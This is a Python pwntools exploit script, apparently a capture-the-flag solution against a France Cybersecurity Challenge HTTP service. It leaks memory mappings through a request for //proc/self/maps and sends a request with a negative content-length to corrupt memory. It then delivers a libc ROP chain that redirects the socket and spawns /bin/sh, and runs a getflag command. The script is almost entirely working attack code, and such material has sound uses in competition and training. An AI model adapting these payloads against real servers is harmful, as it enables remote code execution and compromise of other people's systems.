#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import random

context.update(arch="amd64", os="linux")
context.log_level = 'info'


exe = ELF("main_patched")
libc = ELF("./libc-2.31.so")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

host, port = "http2.france-cybersecurity-challenge.fr", "2106"

if not args.REMOTE:
  LPORT = random.randint(10000, 50000)
  print('LPORT='+str(LPORT))

p = remote(host,port)

REQ = 'GET //proc/self/maps HTTP/1.1\x0d\x0a'
REQ += 'connection: keep-alive\x0d\x0a'
REQ += 'content-length: 0\x0d\x0a\x0d\x0a'

# initialize leaks
prog = 0
lib = 0
heap = 0
#Â dump /proc/self/maps to leaks needed mappings
p.send(REQ)
while True:
  buff = p.recvline()
  if (b'r--p' in buff) and (prog==0):
    prog = int(buff.split(b'-')[0],16)
  if (b'heap' in buff) and (heap==0):
    heap = int(buff.split(b'-')[0],16)
    heap2 = int(p.recvline().split(b'-')[0],16)		# second heap for thread
  if (b'libc-2.31' in buff) and (lib==0):
    lib = int(buff.split(b'-')[0],16)
    break

libc.address = lib
exe.address = prog

logbase()
logleak('prog base', exe.address)
logleak('heap', heap)
logleak('heap2', heap2)

p.clean()

size = -1
REQ = 'POST /coincoin HTTP/1.1\x0d\x0a'
REQ += 'connection: keep-alive\x0d\x0a'
REQ += 'content-length: '+str(size)+'\x0d\x0a'
REQ += 'transfer-encoding:'+'1'+'\x0d\x0a'
REQ += '\x0d\x0a'

p.send(REQ)

REQ = 'POST /coincoin HTTP/1.1\x0d\x0a'
REQ += '\x0d\x0a'

p.send(REQ)

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
# our ROP 
fd = 4
payload2 =  p64(pop_rdi)+p64(fd)+p64(pop_rsi)+p64(0)+p64(libc.sym['dup2'])  # dup2(4,0)
payload2 += p64(pop_rdi)+p64(fd)+p64(pop_rsi)+p64(1)+p64(libc.sym['dup2'])  # dup2(4,1)
payload2 += p64(pop_rdi)+p64(fd)+p64(pop_rsi)+p64(2)+p64(libc.sym['dup2'])
payload2 += p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(libc.sym[b'execve'])

# first payload set correct fp address, off, size, and p_body to jump over canary
payload1 =  p64(heap)+p64(heap2+0xb60)
payload1 += p64(0x38)+p64(0x38+0x30+len(payload2))
payload1 += p64(0)+p64(libc.address-(0x5220+0x60))
print('payload1:\n'+hexdump(payload1))
p.send(payload1)

# wait a bit to separate payload & then send our rop
sleep(2)
p.send(payload2)

sleep(1)
p.sendline('id;/app/getflag')

p.interactive()

